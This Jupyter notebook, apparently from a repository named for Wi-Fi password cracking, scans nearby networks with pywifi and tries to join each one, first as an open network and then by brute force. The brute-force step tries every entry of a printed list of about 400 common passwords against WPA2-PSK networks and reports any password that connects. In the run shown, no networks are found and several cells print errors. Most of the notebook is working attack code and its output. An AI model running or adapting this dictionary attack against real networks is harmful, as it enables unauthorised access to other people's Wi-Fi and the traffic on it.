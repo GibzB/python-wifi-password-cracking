{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "13e0626e",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "#!pip install comtypes\n",
    "#!pip install pywifi\n",
    "\n",
    "import time\n",
    "import pywifi\n",
    "from IPython.display import display, HTML\n",
    "from pywifi import const"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "74ab2ed2",
   "metadata": {},
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "keys = []\n",
    "final_output = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "7a0e65da",
   "metadata": {},
   "outputs": [],
   "source": [
    "#### Get interface information\n",
    "##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. \n",
    "### Get the name of the Wi-Fi interface."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "b7a2d778",
   "metadata": {},
   "outputs": [],
   "source": [
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b9f56d6c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>en0</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML('<h3>{}</h3>'.format(interface.name())))\n",
    "#print(interface.name())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4d9bbd20",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Now let's scan the network.</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Now let's scan the network.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "180d1a90",
   "metadata": {},
   "outputs": [],
   "source": [
    "interface.scan()\n",
    "#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan()\n",
    "#Because the scan time can be different for each Wi-Fi interface provider. \n",
    "time.sleep(5) \n",
    "### Obtain the results of the previous triggerred scan. A Profile list will be returned.\n",
    "x = interface.scan_results()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "9f7c2c19",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Let's See All Network Profiles</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Let's See All Network Profiles</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "b9e95db0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table style=\"font-size:1em\"><tr><th>#</th><th style=\"text-align: Center\">SSID</th><tr><td>1</td><td style=\"text-align: left\">None</td></tr><tr><td>2</td><td style=\"text-align: left\">None</td></tr><tr><td>3</td><td style=\"text-align: left\">None</td></tr><tr><td>4</td><td style=\"text-align: left\">None</td></tr></table>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "available_devices = []\n",
    "for i in x:\n",
    "    available_devices.append(i.ssid)\n",
    "html = '<table style=\"font-size:1em\"><tr><th>{}</th><th style=\"text-align: Center\">{}</th>'.format('#','SSID')\n",
    "c=0\n",
    "for i in available_devices:\n",
    "    c+=1\n",
    "    html+='<tr><td>{}</td><td style=\"text-align: left\">{}</td></tr>'.format(c,i)\n",
    "html+='</table>'\n",
    "display(HTML(html))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "1da6fc29",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Let's See Check for open network around us.</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Let's See Check for open network around us.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "8823be95",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'NoneType' object has no attribute 'strip'\n",
      "'NoneType' object has no attribute 'strip'\n",
      "'NoneType' object has no attribute 'strip'\n",
      "'NoneType' object has no attribute 'strip'\n"
     ]
    }
   ],
   "source": [
    "for i in available_devices:\n",
    "    nm = i\n",
    "    try:\n",
    "        i=i.strip()\n",
    "        profile = pywifi.Profile()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_NONE)\n",
    "        wifi = pywifi.PyWiFi()\n",
    "        iface = wifi.interfaces()[0]\n",
    "        iface.remove_all_network_profiles()\n",
    "        profile = iface.add_network_profile(profile)\n",
    "        iface.connect(profile)\n",
    "        time.sleep(4)\n",
    "        print(\"Trying to Connect to SSID : \",i)\n",
    "        if iface.status() == const.IFACE_CONNECTED:\n",
    "            print('success password of the network',i,' is',\"none\")\n",
    "            final_output[i] = \"\"\n",
    "            available_devices.remove(nm)\n",
    "    except Exception as e:\n",
    "        print(e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "a4d64bb0",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('top400.txt','r') as f:\n",
    "    for i in f:\n",
    "        i = i.replace('\\n','')\n",
    "        if i not in keys:\n",
    "            keys.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "2e0d2477",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['password', '123456789', '12345678', '1q2w3e4r', 'sunshine', 'football', '1234567890', 'computer', 'superman', 'internet', 'iloveyou', '1qaz2wsx', 'baseball', 'whatever', 'princess', 'abcd1234', 'starwars', 'trustno1', 'password1', 'jennifer', 'michelle', 'mercedes', 'benjamin', '11111111', 'samantha', 'victoria', 'alexander', '987654321', 'asdf1234', '1234qwer', 'qwertyuiop', 'q1w2e3r4', 'elephant', 'garfield', 'chocolate', 'jonathan', 'caroline', 'maverick', 'midnight', '88888888', 'creative', 'qwerty123', 'cocacola', 'passw0rd', 'liverpool', 'blink182', 'asdfghjkl', 'danielle', 'scorpion', 'veronica', 'nicholas', 'asdfasdf', 'metallica', 'december', 'patricia', 'christian', 'spiderman', 'security', 'slipknot', 'november', 'jordan23', 'qwertyui', 'butterfly', 'swordfish', 'carolina', 'hardcore', 'corvette', '12341234', 'remember', 'qwer1234', 'leonardo', 'snickers', 'williams', 'angelina', 'anderson', '123123123', 'pakistan', 'marlboro', 'kimberly', '00000000', 'snowball', 'sebastian', 'godzilla', 'hello123', 'champion', 'precious', 'einstein', 'napoleon', 'mountain', 'dolphins', 'charlotte', 'fernando', 'basketball', 'barcelona', '87654321', 'paradise', 'motorola', 'bullshit', 'brooklyn', 'stephanie', 'elizabeth', 'qwerty12', 'franklin', 'american', 'platinum', 'icecream', 'darkness', 'cristina', 'colorado', 'alexandra', 'steelers', 'serenity', 'mitchell', 'lollipop', 'marshall', '1qazxsw2', '12344321', 'startrek', 'christine', 'business', 'nintendo', '12qwaszx', 'asdfghjk', 'Password', '1q2w3e4r5t', 'zaq12wsx', 'scotland', 'hercules', 'explorer', 'manchester', 'firebird', 'engineer', 'virginia', 'simpsons', 'angelica', 'september', 'isabelle', 'isabella', 'changeme', 'passport', 'infinity', 'superstar', 'courtney', 'scarface', 'pavilion', 'abcdefgh', 'a1b2c3d4', 'harrison', 'spitfire', 'catherine', 'birthday', 'wolverine', 'guinness', 'california', 'logitech', 'emmanuel', '11223344', 'goldfish', 'cheyenne', 'testtest', 'stargate', 'microsoft', 'anything', 'aaaaaaaa', 'welcome1', 'eternity', 'westside', 'password123', 'maryjane', 'michael1', 'lawrence', 'kristina', 'kawasaki', 'drowssap', 'blahblah', 'babygirl', 'poohbear', 'florence', 'sapphire', 'hamilton', 'greenday', 'qazwsxedc', 'twilight', 'swimming', 'stardust', 'predator', 'penelope', 'michigan', 'margaret', 'brittany', 'shithead', 'redskins', 'pussycat', 'fireball', 'cherokee', 'australia', '1234abcd', 'lovelove', 'thailand', 'lasvegas', 'butthead', 'blizzard', 'shamrock', 'bluebird', 'atlantis', '147258369', 'valentine', 'magnolia', 'juventus', 'diamonds', 'christopher', 'warcraft', 'renegade', 'mohammed', 'terminator', 'shopping', 'savannah', 'giovanni', '12121212', 'wildcats', 'portugal', 'beautiful', 'sunflower', 'santiago', 'kathleen', 'enterprise', 'clifford', 'christina', '55555555', 'something', 'rosemary', 'vacation', 'hollywood', 'chandler', '99999999', 'lorraine', 'children', 'beatrice', 'airborne', 'valentin', 'moonlight', 'kamikaze', 'strawberry', 'software', '22222222', 'skywalker', 'salvador', 'panthers', 'lacrosse', 'charlie1', 'cardinal', 'bluemoon', '0123456789', 'zeppelin', 'rockstar', 'operator', 'dragonfly', 'dickhead', 'anaconda', 'amsterdam', '789456123', '77777777', 'skittles', 'personal', 'kingkong', 'geronimo', 'christmas', 'wrestling', 'robinson', 'lightning', 'kingston', 'hannibal', 'download', 'darkstar', 'undertaker', 'tinkerbell', 'sweetpea', 'softball', 'panasonic', 'pa55word', 'keyboard', 'darkside', 'cleopatra', 'assassin', 'vladimir', 'national', 'matthew1', 'godfather', 'brothers', 'warriors', 'universe', 'rush2112', 'mushroom', 'bigdaddy', '1a2b3c4d', 'ultimate', 'peterpan', 'loverboy', 'truelove', 'trombone', 'madeline', 'gangster', 'dingdong', 'catalina', 'alejandro', 'kittycat', 'aquarius', '1111111111', 'patriots', 'jamesbond', 'ihateyou', 'blessing', 'airplane', 'Password1', 'stingray', 'hellfire', 'guardian', 'flamingo', '0987654321', 'socrates', 'richmond', 'electric', 'thankyou', 'sterling', 'munchkin', 'morpheus', 'imperial', 'happiness', 'goodluck', 'columbia', 'campbell', 'blackjack', '999999999', 'telephone', 'oblivion', 'newcastle', 'freedom1', 'washington', 'valentina', 'valencia', 'spectrum', 'jessica1', 'jeremiah', 'handsome', 'goldberg', 'gabriela', 'anthony1', 'a1234567', 'xxxxxxxx', 'peekaboo', 'motherfucker', 'montreal', 'katherine', 'kangaroo', 'immortal', 'chocolat', 'thompson', 'research', 'oklahoma', 'mariposa', 'idontknow', 'defender', 'applepie', 'squirrel', 'pineapple', 'hongkong', 'dinosaur', 'babydoll', 'wolfgang', 'semperfi', 'patience', 'fletcher', 'drpepper', 'creation', 'wordpass', 'passwort', 'original', 'nightmare', 'martinez', 'labrador', 'excalibur', 'discovery', 'apple123', 'sundance', 'redwings', 'mypassword', 'monopoly', 'margarita', 'lionking', 'football1', 'director', '44444444', 'sylvester', 'sherlock', 'marianne', 'lancelot', 'jeanette', 'cannabis', 'andromeda', 'werewolf', 'starcraft', 'marathon', 'longhorn', 'happy123', 'brucelee', 'argentina', '147852369', 'wrangler', 'william1', 'stranger', 'scarlett', 'qweasdzxc', 'playstation', 'morrison', 'february', 'fantasia', 'designer', 'bulldogs', 'sullivan', 'saturday', 'pingpong', 'kristine', 'halloween', 'fuckyou1', 'fearless', 'cassandra', 'bismillah', 'airforce', 'theodore', 'starfish', 'pass1234', 'cinnamon', 'sweetheart', 'overlord', 'michaela', 'meredith', 'buttercup', 'abc12345', 'aardvark', 'Passw0rd', '12345678910', 'universal', 'trinidad', 'thursday', 'standard', 'pearljam', 'anonymous']\n"
     ]
    }
   ],
   "source": [
    "print(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "c54309fa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'NoneType' object has no attribute 'strip'\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    for i in available_devices:\n",
    "        profile = pywifi.Profile()\n",
    "        i=i.strip()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "        flag=0\n",
    "        for j in keys:\n",
    "            j=j.strip()\n",
    "            profile.key = j\n",
    "            wifi = pywifi.PyWiFi()\n",
    "            iface = wifi.interfaces()[0]\n",
    "            iface.remove_all_network_profiles()\n",
    "            profile = iface.add_network_profile(profile)\n",
    "\n",
    "            iface.connect(profile)\n",
    "            time.sleep(4)\n",
    "            if iface.status() == const.IFACE_CONNECTED:\n",
    "                print('success password of the network',i,' is',j)\n",
    "                final_output[i] = j\n",
    "                flag=1\n",
    "                break\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "        #if flag == 0:\n",
    "        #print('sorry we are not able to CRACK PASSWORD of',i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "ce080d5a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "********** Discovered Password **********\n",
      "HOST NAME          PASSWORD    \n"
     ]
    }
   ],
   "source": [
    "print('*'*10,'Discovered Password','*'*10)\n",
    "print(\"{0:<18} {1:<12}\".format(\"HOST NAME\",\"PASSWORD\"))\n",
    "for SSID,Key in final_output.items():\n",
    "    print (\"{:<19}{:<5}\".format(SSID, Key))\n",
    "available_devices.clear()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "513fa99b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
